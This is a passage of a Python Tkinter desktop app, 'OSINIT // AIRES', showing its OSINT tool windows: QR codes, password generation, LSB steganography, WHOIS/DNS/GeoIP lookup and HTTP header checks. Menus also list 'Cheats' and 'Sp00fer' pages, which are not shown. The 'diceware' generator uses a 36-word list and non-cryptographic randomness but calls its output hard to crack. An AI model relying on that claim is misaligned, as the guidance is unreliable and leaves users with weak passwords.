            "AvioesInvestigacaoWidget": globals().get("AvioesInvestigacaoWidget"),
            "BarcosInvestigacaoWidget": globals().get("BarcosInvestigacaoWidget"),
            "DronesInvestigacaoWidget": globals().get("DronesInvestigacaoWidget"),
        }
        for tab_id in order:
            if tab_id in hidden:
                continue
            if tab_id not in self.TAB_DEFS:
                continue
            display_text, widget_class_name = self.TAB_DEFS[tab_id]
            tab_frame = tk.Frame(self.notebook, bg=BG)
            self.notebook.add(tab_frame, text=display_text)
            self.tab_frames[tab_id] = tab_frame
            widget_class = class_map.get(widget_class_name)
            if widget_class:
                try:
                    widget = widget_class(tab_frame)
                    widget.pack(fill="both", expand=True, padx=14, pady=14)
                    self.widgets[tab_id] = widget
                except Exception as e:
                    tk.Label(tab_frame, text=f"Erro {display_text}: {e}", bg=BG, fg=ERROR).pack(pady=20)
        self.dashboard_widget = self.widgets.get("dash")
        self.buscas_widget = self.widgets.get("buscas")
        self.casos_widget = self.widgets.get("casos")
        self.clientes_widget = self.widgets.get("clientes")
        self.osint_widget = self.widgets.get("osint")
        self.veiculos_widget = self.widgets.get("veiculos")
        self.camaras_widget = self.widgets.get("camaras")
    def rebuild_tabs(self):
        self.build_tabs()
        self.on_show()
    def on_show(self):
        for w in [self.dashboard_widget, self.casos_widget, self.clientes_widget, self.buscas_widget, self.osint_widget, self.veiculos_widget, self.camaras_widget, self.widgets.get("avioes"), self.widgets.get("barcos"), self.widgets.get("drones")]:
            try:
                if w:
                    if hasattr(w, 'refresh_stats'):
                        w.refresh_stats()
                    if hasattr(w, 'refresh_list'):
                        if hasattr(w, 'records'):
                            if w == self.casos_widget:
                                w.records = load_json(CASOS_FILE)
                            elif w == self.clientes_widget:
                                w.records = load_json(CLIENTES_FILE)
                            elif w == self.buscas_widget:
                                w.records = load_json(BUSCAS_FILE)
                        w.refresh_list()
                    if hasattr(w, 'refresh_casos'):
                        w.refresh_casos()
                    if hasattr(w, 'load_camaras'):
                        w.load_camaras()
            except Exception:
                pass


# ─────────────────────────────────────────────
# Main App - COM Administração acima de SAIR
# ─────────────────────────────────────────────
class MainApp(tk.Tk):
    SIDEBAR_DISPLAY = {
        "UsuarioPage": "👤  Usuário",
        "RedeAiresPage": "✦  Rede Aires",
        "InvestigacaoPage": "🔎  Investigação",
        "IAPage": "🤖  IA",
        "IPTVPage": "📺  IPTV",
        "RadioPage": "📻  Radio",
        "MusicPage": "🎵  Music",
        "CheatsPage": "🎮  Cheats",
        "SpooferPage": "🎭  Sp00fer",
        "MilitarPage": "🪖  Militar",
        "NavegadoresPage": "🌐  Navegadores",
        "FerramentasPage": "🧰  Ferramentas",
        "": "ℹ  Sobre",
        "AdministracaoPage": "🛡  Administração",
    }

    def __init__(self, username):
        super().__init__()
        self.username = username
        self.title(f"OSINIT // AIRES — Painel [{username}]")
        self.geometry("1240x780")
        self.minsize(1100, 700)
        self.configure(bg=BG)
        self.ui_config = load_ui_config()
        self.sidebar = tk.Frame(self, bg=SIDEBAR_BG, width=230)
        self.sidebar.pack(side="left", fill="y")
        self.sidebar.pack_propagate(False)
        tk.Label(self.sidebar, text="OSINIT", bg=SIDEBAR_BG, fg=ACCENT, font=(FONT_MONO, 18, "bold")).pack(pady=(24, 0))
        tk.Label(self.sidebar, text="▲ AIRES ▲", bg=SIDEBAR_BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(pady=(2, 6))
        tk.Label(self.sidebar, text=f"sessão: {username}", bg=SIDEBAR_BG, fg=TEXT_DIM, font=(FONT_MONO, 7)).pack(pady=(0, 12))
        self.status_btn = tk.Button(self.sidebar, text="● SISTEMA ONLINE", command=lambda: self.show_page("UsuarioPage"), bg=SIDEBAR_BG, fg="#00ff88", activebackground=SIDEBAR_BG, activeforeground="#00ff88", relief="flat", bd=0, font=(FONT_MONO, 7, "bold"), cursor="hand2")
        self.status_btn.pack(pady=(0, 10))
        tk.Frame(self.sidebar, bg=ACCENT_DIM, height=1).pack(fill="x", padx=16, pady=(0, 8))

        self.content_container = tk.Frame(self, bg=BG)
        self.content_container.pack(side="left", fill="both", expand=True)

        # Páginas principais
        self.pages = {}
        for PageClass in (UsuarioPage, InvestigacaoPage, IPTVPage, RadioPage, RedeAiresPage, IAPage, MusicPage, CheatsPage, SpooferPage, MilitarPage, NavegadoresPage, FerramentasPage,  AdministracaoPage):
            page = PageClass(self.content_container, self)
            self.pages[PageClass.__name__] = page
            page.place(x=0, y=0, relwidth=1, relheight=1)

        # Frame scrollável para menu principal
        self.sidebar_menu_frame = tk.Frame(self.sidebar, bg=SIDEBAR_BG)
        self.sidebar_menu_frame.pack(fill="both", expand=True, padx=0, pady=0)

        # ── ÁREA ADMINISTRAÇÃO EM CIMA DE SAIR ──
        self.admin_separator = tk.Frame(self.sidebar, bg=ACCENT_DIM, height=1)
        self.admin_separator.pack(fill="x", padx=16, pady=(8, 6), side="bottom")

        self.admin_frame = tk.Frame(self.sidebar, bg="#0a1420", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.admin_frame.pack(fill="x", padx=8, pady=(0, 8), side="bottom")

        tk.Label(self.admin_frame, text="ADMINISTRAÇÃO", bg="#0a1420", fg=ACCENT, font=(FONT_MONO, 7, "bold")).pack(anchor="w", padx=10, pady=(8,2))
        self.admin_btn = tk.Button(self.admin_frame, text="🛡  Administração", anchor="w", padx=12, command=lambda: self.show_page("AdministracaoPage"))
        self.admin_btn.pack(fill="x", padx=6, pady=(2, 8), ipady=8)
        self.admin_btn.configure(bg="#102233", fg=ACCENT, activebackground=ACCENT_DIM, activeforeground=ACCENT, relief="flat", bd=0, font=(FONT_MONO, 8, "bold"), cursor="hand2", highlightthickness=1, highlightbackground=ACCENT)

        # Separador antes do sair
        tk.Frame(self.sidebar, bg=ACCENT_DIM, height=1).pack(fill="x", padx=16, pady=(0, 8), side="bottom")

        btn_exit = tk.Button(self.sidebar, text="✕  SAIR", anchor="w", padx=14, command=self.destroy)
        btn_exit.pack(fill="x", padx=12, pady=(0, 12), ipady=7, side="bottom")
        btn_exit.configure(bg="#1a0a0f", fg=ERROR, activebackground="#2a0f17", activeforeground=ERROR, relief="flat", bd=0, font=(FONT_MONO, 8, "bold"), cursor="hand2", highlightthickness=1, highlightbackground="#3a1620")

        self.rebuild_sidebar()
        self.show_page("UsuarioPage")

    def rebuild_sidebar(self):
        for w in self.sidebar_menu_frame.winfo_children():
            w.destroy()
        self.ui_config = load_ui_config()
        order = self.ui_config.get("sidebar_order", get_default_ui_config()["sidebar_order"])
        hidden = self.ui_config.get("sidebar_hidden", [])
        custom_cats = {c.get("id"): c for c in self.ui_config.get("custom_categories", [])}
        self.sidebar_buttons = {}

        for page_name in order:
            if page_name in hidden:
                continue
            # Custom category
            if page_name in custom_cats:
                cat = custom_cats[page_name]
                texto = f"{cat.get('icone','📁')}  {cat.get('nome', page_name)}"
                # Criar página custom se não existe
                if page_name not in self.pages:
                    self.create_custom_page(page_name, cat)
            else:
                if page_name not in self.SIDEBAR_DISPLAY:
                    continue
                # Não mostrar Administração no menu principal, já está na área dedicada
                if page_name == "AdministracaoPage":
                    continue
                texto = self.SIDEBAR_DISPLAY[page_name]

            b = tk.Button(self.sidebar_menu_frame, text=texto, command=lambda p=page_name: self.show_page(p))
            b.pack(fill="x", padx=10, pady=2, ipady=8)
            style_sidebar_button(b)
            self.sidebar_buttons[page_name] = b

        # Destacar ativo
        if hasattr(self, 'current_page_name') and self.current_page_name in self.sidebar_buttons:
            try:
                self.sidebar_buttons[self.current_page_name].configure(bg=ACCENT_DIM, fg=ACCENT, highlightbackground=ACCENT)
            except Exception:
                pass

        # Destacar admin se ativo
        try:
            if getattr(self, 'current_page_name', '') == "AdministracaoPage":
                self.admin_btn.configure(bg=ACCENT_DIM, fg=ACCENT, highlightbackground=ACCENT)
            else:
                self.admin_btn.configure(bg="#102233", fg=ACCENT, highlightbackground=ACCENT)
        except:
            pass

    def create_custom_page(self, page_id, cat_data):
        # Cria página genérica para categoria custom
        class CustomPage(Page):
            def __init__(self, parent, app, cat=cat_data, pid=page_id):
                super().__init__(parent, app)
                self.cat = cat
                self.pid = pid
                self.header(f"{cat.get('icone','📁')} {cat.get('nome','Categoria').upper()}", cat.get('descricao','Categoria personalizada criada em Administração'))
                tk.Label(self, text=cat.get('icone','📁'), bg=BG, fg=ACCENT, font=(FONT_MONO, 40, "bold")).pack(pady=(40,10))
                tk.Label(self, text=cat.get('nome','Categoria'), bg=BG, fg=TEXT, font=(FONT_MONO, 18, "bold")).pack()
                tk.Label(self, text=f"ID: {cat.get('id')}", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(pady=4)
                tk.Label(self, text=cat.get('descricao','Sem descrição'), bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 9), wraplength=600, justify="center").pack(pady=10)
                tk.Label(self, text=f"Criada em: {cat.get('created','—')}", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(pady=2)
                # Botão para gerir em Administração
                btn = tk.Button(self, text="⚙ GERIR EM ADMINISTRAÇÃO", command=lambda: app.show_page("AdministracaoPage"), bg=ACCENT_DIM, fg=ACCENT, font=(FONT_MONO, 9, "bold"), relief="flat", bd=0, padx=16, pady=8, cursor="hand2")
                btn.pack(pady=20)

        page = CustomPage(self.content_container, self, cat_data, page_id)
        self.pages[page_id] = page
        page.place(x=0, y=0, relwidth=1, relheight=1)

    def show_page(self, name):
        # Se for custom e não existe, tenta criar
        if name not in self.pages:
            custom_cats = {c.get("id"): c for c in self.ui_config.get("custom_categories", [])}
            if name in custom_cats:
                self.create_custom_page(name, custom_cats[name])
            else:
                messagebox.showwarning("Aviso", f"Página {name} não encontrada.")
                return
        self.current_page_name = name
        # reset cores menu principal
        if hasattr(self, 'sidebar_buttons'):
            for pn, btn in self.sidebar_buttons.items():
                try:
                    if pn == name:
                        btn.configure(bg=ACCENT_DIM, fg=ACCENT, highlightbackground=ACCENT)
                    else:
                        btn.configure(bg=BTN_BG, fg=TEXT, highlightbackground=ACCENT_DIM)
                except Exception:
                    pass
        # admin btn highlight
        try:
            if name == "AdministracaoPage":
                self.admin_btn.configure(bg=ACCENT_DIM, fg=ACCENT, highlightbackground=ACCENT)
            else:
                self.admin_btn.configure(bg="#102233", fg=ACCENT, highlightbackground=ACCENT)
        except:
            pass

        page = self.pages[name]
        page.tkraise()
        if hasattr(page, "on_show"):
            page.on_show()


# ─────────────────────────────────────────────
# Janelas de ferramentas
# ─────────────────────────────────────────────
class ToolWindow(tk.Toplevel):
    def __init__(self, parent, title, size):
        super().__init__(parent)
        self.title(title)
        self.geometry(size)
        self.resizable(False, False)
        self.configure(bg=BG)



# ─────────────────────────────────────────────
# NOVAS FERRAMENTAS MELHORADAS - Sem Essential Linux
# ─────────────────────────────────────────────

class QRCodeTool(ToolWindow):
    def __init__(self, parent):
        super().__init__(parent, "OSINIT // QR Code Lab", "600x550")
        tk.Label(self, text="QR CODE LAB - Gerar & Ler", bg=BG, fg=ACCENT, font=(FONT_MONO, 12, "bold")).pack(pady=10)
        tk.Label(self, text="Texto/URL para gerar:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(anchor="w", padx=14)
        self.input_entry = tk.Entry(self, bg=PANEL_BG, fg=TEXT, font=(FONT_MONO, 10), relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.input_entry.pack(fill="x", padx=14, pady=4, ipady=6)
        self.input_entry.insert(0, "https://osint.aires - Caso exemplo")
        btn_row = tk.Frame(self, bg=BG)
        btn_row.pack(fill="x", padx=14, pady=8)
        for txt, cmd in [("GERAR QR", self.gerar_qr), ("LER QR DE IMAGEM", self.ler_qr), ("COPIAR", self.copiar), ("GUARDAR PNG", self.guardar)]:
            b = tk.Button(btn_row, text=txt, command=cmd)
            b.pack(side="left", padx=4, fill="x", expand=True, ipady=6)
            style_button(b)
            b.configure(font=(FONT_MONO, 7, "bold"))
        self.canvas_frame = tk.Frame(self, bg=PANEL_BG, width=300, height=300)
        self.canvas_frame.pack(pady=10)
        self.canvas_frame.pack_propagate(False)
        self.qr_label = tk.Label(self.canvas_frame, text="QR CODE\n\nClique GERAR\n\n300x300", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 10))
        self.qr_label.pack(fill="both", expand=True)
        self.qr_image = None
        self.tk_img = None
        self.result_text = scrolledtext.ScrolledText(self, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, height=6, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.result_text.pack(fill="both", expand=True, padx=14, pady=10)
        self.result_text.insert("1.0", "QR Code Lab pronto.\n- Gera QR de texto/URL\n- Lê QR de imagem (requer pyzbar)\n- Guarda PNG\n- Usa para partilhar links de casos, contactos, etc.\n")

    def gerar_qr(self):
        txt = self.input_entry.get().strip()
        if not txt:
            return
        try:
            qrcode_mod = ensure_package("qrcode", "qrcode")
            if not qrcode_mod:
                raise Exception("Instala qrcode: pip install qrcode[pil]")
            from PIL import Image, ImageTk
            import qrcode
            qr = qrcode.QRCode(version=1, box_size=10, border=2)
            qr.add_data(txt)
            qr.make(fit=True)
            img = qr.make_image(fill_color="#00e5ff", back_color="#0b0f16").convert("RGB")
            img = img.resize((280,280))
            self.qr_image = img
            self.tk_img = ImageTk.PhotoImage(img)
            self.qr_label.configure(image=self.tk_img, text="")
            self.qr_label.image = self.tk_img
            self.result_text.delete("1.0", "end")
            self.result_text.insert("1.0", f"QR Gerado: {txt}\nTamanho: 280x280\nPronto para guardar ou copiar.")
        except Exception as e:
            self.result_text.delete("1.0", "end")
            self.result_text.insert("1.0", f"Erro QR: {e}\nTenta pip install qrcode[pil] pillow")

    def ler_qr(self):
        path = filedialog.askopenfilename(filetypes=[("Imagens","*.png *.jpg *.jpeg")])
        if not path:
            return
        try:
            from PIL import Image
            # Tenta pyzbar
            pyzbar_mod = ensure_package("pyzbar", "pyzbar")
            if pyzbar_mod:
                from pyzbar.pyzbar import decode
                img = Image.open(path)
                decoded = decode(img)
                if decoded:
                    data = "\n".join([d.data.decode() for d in decoded])
                    self.result_text.delete("1.0", "end")
                    self.result_text.insert("1.0", f"Lido de {path}:\n{data}")
                    self.input_entry.delete(0, "end")
                    self.input_entry.insert(0, data[:100])
                else:
                    self.result_text.delete("1.0", "end")
                    self.result_text.insert("1.0", "Nenhum QR encontrado na imagem.")
            else:
                self.result_text.delete("1.0", "end")
                self.result_text.insert("1.0", "pyzbar não instalado. pip install pyzbar")
        except Exception as e:
            self.result_text.delete("1.0", "end")
            self.result_text.insert("1.0", f"Erro ler: {e}")

    def copiar(self):
        txt = self.input_entry.get().strip()
        self.clipboard_clear()
        self.clipboard_append(txt)

    def guardar(self):
        if not self.qr_image:
            messagebox.showwarning("Aviso","Gera QR primeiro")
            return
        path = filedialog.asksaveasfilename(defaultextension=".png", filetypes=[("PNG","*.png")])
        if path:
            self.qr_image.save(path)
            messagebox.showinfo("Guardado", path)


class PasswordGeneratorTool(ToolWindow):
    def __init__(self, parent):
        super().__init__(parent, "OSINIT // Password Generator Pro", "550x500")
        tk.Label(self, text="GERADOR DE SENHAS FORTE", bg=BG, fg=ACCENT, font=(FONT_MONO, 12, "bold")).pack(pady=10)
        opts = tk.Frame(self, bg=BG)
        opts.pack(fill="x", padx=14, pady=6)
        self.length_var = tk.IntVar(value=20)
        tk.Label(opts, text="Tamanho:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left")
        tk.Scale(opts, from_=8, to=64, variable=self.length_var, orient="horizontal", bg=BG, fg=ACCENT, highlightthickness=0, troughcolor=PANEL_BG, length=200).pack(side="left", padx=10)
        tk.Label(opts, textvariable=self.length_var, bg=BG, fg=ACCENT, font=(FONT_MONO, 10, "bold")).pack(side="left")
        checks = tk.Frame(self, bg=BG)
        checks.pack(fill="x", padx=14, pady=6)
        self.upper_var = tk.BooleanVar(value=True)
        self.lower_var = tk.BooleanVar(value=True)
        self.digits_var = tk.BooleanVar(value=True)
        self.symbols_var = tk.BooleanVar(value=True)
        for txt,var in [("MAIÚSCULAS",self.upper_var),("minúsculas",self.lower_var),("123 números",self.digits_var),("!@# símbolos",self.symbols_var)]:
            tk.Checkbutton(checks, text=txt, variable=var, bg=BG, fg=TEXT, selectcolor=PANEL_BG, font=(FONT_MONO, 8)).pack(side="left", padx=6)
        btn_row = tk.Frame(self, bg=BG)
        btn_row.pack(fill="x", padx=14, pady=10)
        for txt,cmd in [("GERAR",self.gerar),("DICEWARE",self.diceware),("COPIAR",self.copiar),("ENTROPIA",self.entropia)]:
            b = tk.Button(btn_row, text=txt, command=cmd)
            b.pack(side="left", padx=4, fill="x", expand=True, ipady=6)
            style_button(b)
        self.out_text = scrolledtext.ScrolledText(self, font=(FONT_MONO, 11), bg=PANEL_BG, fg="#00ff88", height=8, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.out_text.pack(fill="both", expand=True, padx=14, pady=10)
        self.out_text.insert("1.0", "Gerador pronto.\nClique GERAR para senha forte.\nDICEWARE gera 6 palavras aleatórias.\nENTROPIA calcula força.\n")
        self.last_pwd = ""

    def gerar(self):
        import string, secrets
        chars = ""
        if self.upper_var.get(): chars += string.ascii_uppercase
        if self.lower_var.get(): chars += string.ascii_lowercase
        if self.digits_var.get(): chars += string.digits
        if self.symbols_var.get(): chars += "!@#$%^&*()-_=+[]{}|;:,.<>?"
        if not chars:
            chars = string.ascii_letters + string.digits
        length = self.length_var.get()
        pwd = "".join(secrets.choice(chars) for _ in range(length))
        self.last_pwd = pwd
        self.out_text.delete("1.0", "end")
        self.out_text.insert("1.0", f"{pwd}\n\nTamanho: {length}\nCharset: {len(chars)} chars\nEntropia: {length * math.log2(len(chars)):.1f} bits")

    def diceware(self):
        words = ["alfa","bravo","charlie","delta","echo","foxtrot","golf","hotel","india","juliet","kilo","lima","mike","november","oscar","papa","quebec","romeo","sierra","tango","uniform","victor","whiskey","xray","yankee","zulu","aires","osint","forense","radar","drone","porto","lisboa","seguro","forte","codigo"]
        import random
        pwd = "-".join(random.choice(words) for _ in range(6))
        self.last_pwd = pwd
        self.out_text.delete("1.0", "end")
        self.out_text.insert("1.0", f"DICEWARE:\n{pwd}\n\n6 palavras aleatórias - fácil de lembrar, difícil de quebrar")

    def copiar(self):
        self.clipboard_clear()
        self.clipboard_append(self.last_pwd)

    def entropia(self):
        txt = self.out_text.get("1.0","end-1c").split("\n")[0]
        if not txt:
            return
        import math
        charset = len(set(txt))
        ent = len(txt) * math.log2(charset) if charset>1 else 0
        self.out_text.insert("end", f"\n\nEntropia estimada: {ent:.1f} bits\nForça: {'FRACA' if ent<40 else 'MÉDIA' if ent<70 else 'FORTE'}")


class SteganographyTool(ToolWindow):
    def __init__(self, parent):
        super().__init__(parent, "OSINIT // Steganografia", "600x500")
        tk.Label(self, text="STEGANOGRAFIA - Esconder dados em imagem", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(pady=8)
        tk.Label(self, text="Texto secreto:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(anchor="w", padx=14)
        self.secret_entry = tk.Entry(self, bg=PANEL_BG, fg=TEXT, font=(FONT_MONO, 10), relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.secret_entry.pack(fill="x", padx=14, pady=4, ipady=6)
        self.secret_entry.insert(0, "Mensagem secreta para caso X")
        btn_row = tk.Frame(self, bg=BG)
        btn_row.pack(fill="x", padx=14, pady=8)
        for txt,cmd in [("📁 SELECIONAR IMAGEM",self.select_img),("🔒 ESCONDER",self.esconder),("🔓 EXTRAIR",self.extrair),("🧹 LIMPAR",self.limpar)]:
            b = tk.Button(btn_row, text=txt, command=cmd)
            b.pack(side="left", padx=4, fill="x", expand=True, ipady=5)
            style_button(b)
            b.configure(font=(FONT_MONO, 7, "bold"))
        self.img_path = None
        self.text_out = scrolledtext.ScrolledText(self, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, height=14, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.text_out.pack(fill="both", expand=True, padx=14, pady=10)
        self.text_out.insert("1.0", "Steganografia LSB - Esconde texto em imagem PNG\n\n1. Seleciona imagem PNG\n2. Escreve texto secreto\n3. Clica ESCONDER -> guarda nova imagem\n4. Para extrair, seleciona imagem com dados e clica EXTRAIR\n\nÚtil para OSINT: esconder coordenadas, notas, etc.\n")

    def select_img(self):
        path = filedialog.askopenfilename(filetypes=[("PNG","*.png"),("JPG","*.jpg *.jpeg")])
        if path:
            self.img_path = path
            self.text_out.insert("end", f"\nImagem selecionada: {path}")

    def esconder(self):
        if not self.img_path:
            messagebox.showwarning("Aviso","Seleciona imagem primeiro")
            return
        secret = self.secret_entry.get().strip()
        if not secret:
            return
        try:
            from PIL import Image
            img = Image.open(self.img_path)
            # LSB simples
            secret_bin = "".join(format(ord(c), "08b") for c in secret) + "1111111111111110"  # delimitador
            pixels = list(img.getdata())
            new_pixels = []
            idx = 0
            for pixel in pixels:
                if idx < len(secret_bin):
                    # Modifica LSB do canal R
                    if isinstance(pixel, tuple):
                        r,g,b = pixel[:3]
                        r = (r & ~1) | int(secret_bin[idx])
                        new_pixels.append((r,g,b) + pixel[3:] if len(pixel)>3 else (r,g,b))
                        idx+=1
                    else:
                        new_pixels.append((pixel & ~1) | int(secret_bin[idx]))
                        idx+=1
                else:
                    new_pixels.append(pixel)
            new_img = Image.new(img.mode, img.size)
            new_img.putdata(new_pixels)
            save_path = filedialog.asksaveasfilename(defaultextension=".png", filetypes=[("PNG","*.png")], initialfile="stego_"+os.path.basename(self.img_path))
            if save_path:
                new_img.save(save_path)
                self.text_out.insert("end", f"\n✅ Texto escondido em: {save_path}\n{len(secret_bin)} bits")
                messagebox.showinfo("Stego", f"Guardado em {save_path}")
        except Exception as e:
            self.text_out.insert("end", f"\nErro: {e}")

    def extrair(self):
        if not self.img_path:
            messagebox.showwarning("Aviso","Seleciona imagem com dados escondidos")
            return
        try:
            from PIL import Image
            img = Image.open(self.img_path)
            pixels = list(img.getdata())
            binary = ""
            for pixel in pixels:
                if isinstance(pixel, tuple):
                    binary += str(pixel[0] & 1)
                else:
                    binary += str(pixel & 1)
            # Procura delimitador
            chars = []
            for i in range(0, len(binary), 8):
                byte = binary[i:i+8]
                if len(byte)<8:
                    break
                if byte == "11111111":
                    # Checa próximo também 11111110
                    if i+8 < len(binary) and binary[i+8:i+16] == "11111110":
                        break
                try:
                    chars.append(chr(int(byte,2)))
                except:
                    break
            extracted = "".join(chars).split("1111111111111110")[0]
            # Limpa caracteres não printáveis do final
            extracted = "".join(c for c in extracted if c.isprintable() or c in "\n\r\t")
            self.text_out.delete("1.0", "end")
            self.text_out.insert("1.0", f"Extraído de {self.img_path}:\n\n{extracted}\n\nBits lidos: {len(binary)}")
        except Exception as e:
            self.text_out.insert("end", f"\nErro extrair: {e}")

    def limpar(self):
        self.text_out.delete("1.0", "end")


class WHOISIntelTool(ToolWindow):
    def __init__(self, parent):
        super().__init__(parent, "OSINIT // WHOIS & IP Intel", "700x600")
        tk.Label(self, text="WHOIS & IP INTEL", bg=BG, fg=ACCENT, font=(FONT_MONO, 12, "bold")).pack(pady=8)
        entry_row = tk.Frame(self, bg=BG)
        entry_row.pack(fill="x", padx=14, pady=6)
        tk.Label(entry_row, text="Domínio/IP:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left")
        self.target_entry = tk.Entry(entry_row, bg=PANEL_BG, fg=TEXT, font=(FONT_MONO, 10), relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.target_entry.pack(side="left", fill="x", expand=True, padx=8, ipady=5)
        self.target_entry.insert(0, "google.com")
        btn_row = tk.Frame(self, bg=BG)
        btn_row.pack(fill="x", padx=14, pady=6)
        for txt,cmd in [("WHOIS",self.whois),("DNS",self.dns_lookup),("GEOIP",self.geoip),("HEADERS",self.headers),("ABRIR VT",self.virustotal)]:
            b = tk.Button(btn_row, text=txt, command=cmd)
            b.pack(side="left", padx=4, fill="x", expand=True, ipady=5)
            style_button(b)
        self.out = scrolledtext.ScrolledText(self, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.out.pack(fill="both", expand=True, padx=14, pady=10)
        self.out.insert("1.0", "WHOIS & IP Intel pronto.\n\n- WHOIS: usa python-whois se instalado\n- DNS: nslookup\n- GEOIP: ip-api.com (grátis)\n- Headers: análise HTTP\n- VT: abre VirusTotal\n")

    def whois(self):
        target = self.target_entry.get().strip()
        self.out.delete("1.0", "end")
        self.out.insert("1.0", f"WHOIS para {target}...\n")
        try:
            whois_mod = ensure_package("python-whois", "whois")
            if whois_mod:
                import whois
                w = whois.whois(target)
                self.out.insert("end", f"\n{w}")
            else:
                # fallback dig
                result = subprocess.run(["whois", target], capture_output=True, text=True, timeout=10)
                self.out.insert("end", result.stdout or result.stderr)
        except Exception as e:
            self.out.insert("end", f"\nErro WHOIS: {e}\nTenta: whois {target} no terminal ou pip install python-whois")

    def dns_lookup(self):
        target = self.target_entry.get().strip()
        self.out.delete("1.0", "end")
        self.out.insert("1.0", f"DNS Lookup {target}...\n")
        try:
            import socket
            ip = socket.gethostbyname(target)
            self.out.insert("end", f"\nIP: {ip}\n")
            # nslookup
            for qtype in ["A","AAAA","MX","NS","TXT"]:
                try:
                    result = subprocess.run(["nslookup", "-type="+qtype, target], capture_output=True, text=True, timeout=5)
                    self.out.insert("end", f"\n--- {qtype} ---\n{result.stdout[:500]}\n")
                except:
                    pass
        except Exception as e:
            self.out.insert("end", f"Erro: {e}")

    def geoip(self):
        target = self.target_entry.get().strip()
        self.out.delete("1.0", "end")
        self.out.insert("1.0", f"GeoIP para {target}...\n")
        def worker():
            try:
                import socket
                # Resolve IP se domínio
                try:
                    ip = socket.gethostbyname(target)
                except:
                    ip = target
                url = f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query"
                with urllib.request.urlopen(url, timeout=8) as r:
                    data = json.loads(r.read().decode())
                    txt = f"IP: {data.get('query')}\nPaís: {data.get('country')} ({data.get('countryCode')})\nRegião: {data.get('regionName')}\nCidade: {data.get('city')}\nZIP: {data.get('zip')}\nLat/Lon: {data.get('lat')},{data.get('lon')}\nTimezone: {data.get('timezone')}\nISP: {data.get('isp')}\nOrg: {data.get('org')}\nAS: {data.get('as')}\n"
                    self.after(0, lambda: self.out.insert("end", txt))
            except Exception as e:
                self.after(0, lambda: self.out.insert("end", f"Erro GeoIP: {e}"))
        threading.Thread(target=worker, daemon=True).start()

    def headers(self):
        target = self.target_entry.get().strip()
        if not target.startswith("http"):
            target = "https://"+target
        self.out.delete("1.0", "end")
        self.out.insert("1.0", f"Headers para {target}...\n")
        def worker():
            try:
                req = urllib.request.Request(target, headers={"User-Agent":"OSINIT-Aires"})
                with urllib.request.urlopen(req, timeout=8) as r:
                    headers = r.headers
                    txt = f"URL: {target}\nStatus: {r.status}\n\nHEADERS:\n"
                    for k,v in headers.items():
                        txt += f"{k}: {v}\n"
                    self.after(0, lambda: self.out.insert("end", txt))
            except Exception as e:
                self.after(0, lambda: self.out.insert("end", f"Erro: {e}"))
        threading.Thread(target=worker, daemon=True).start()

    def virustotal(self):
        target = self.target_entry.get().strip()
        webbrowser.open(f"https://www.virustotal.com/gui/domain/{target}")


class HeadersAnalyzerTool(ToolWindow):
    def __init__(self, parent):
        super().__init__(parent, "OSINIT // Headers & UA Analyzer", "650x500")
        tk.Label(self, text="HEADERS & USER-AGENT ANALYZER", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(pady=8)
        tk.Label(self, text="URL:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(anchor="w", padx=14)
        self.url_entry = tk.Entry(self, bg=PANEL_BG, fg=TEXT, font=(FONT_MONO, 10), relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.url_entry.pack(fill="x", padx=14, pady=4, ipady=5)
        self.url_entry.insert(0, "https://httpbin.org/user-agent")
        btn_row = tk.Frame(self, bg=BG)
        btn_row.pack(fill="x", padx=14, pady=8)
        for txt,cmd in [("ANALISAR HEADERS",self.analisar),("GERAR UA RANDOM",self.gerar_ua),("CHECK CORS",self.check_cors)]:
            b = tk.Button(btn_row, text=txt, command=cmd)
            b.pack(side="left", padx=4, fill="x", expand=True, ipady=5)
            style_button(b)
        self.out = scrolledtext.ScrolledText(self, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.out.pack(fill="both", expand=True, padx=14, pady=10)
        self.out.insert("1.0", "Headers Analyzer pronto.\nAnalisa User-Agent, CORS, security headers, etc.\n")

    def analisar(self):
        url = self.url_entry.get().strip()
        if not url.startswith("http"):
            url = "https://"+url
        self.out.delete("1.0", "end")
        self.out.insert("1.0", f"A analisar {url}...\n")
        def worker():
            try:
                req = urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=8) as r:
                    h = r.headers
                    ua = h.get("Server","")
                    txt = f"URL: {url}\nStatus: {r.status}\nServer: {ua}\n\n--- SECURITY HEADERS ---\n"
                    sec_headers = ["Content-Security-Policy","X-Frame-Options","X-Content-Type-Options","Strict-Transport-Security","X-XSS-Protection","Referrer-Policy"]
                    for sh in sec_headers:
                        val = h.get(sh, "MISSING ❌")
                        txt += f"{sh}: {val}\n"
                    txt += "\n--- ALL HEADERS ---\n"
                    for k,v in h.items():
                        txt += f"{k}: {v}\n"
                    self.after(0, lambda: (self.out.delete("1.0","end"), self.out.insert("1.0", txt)))
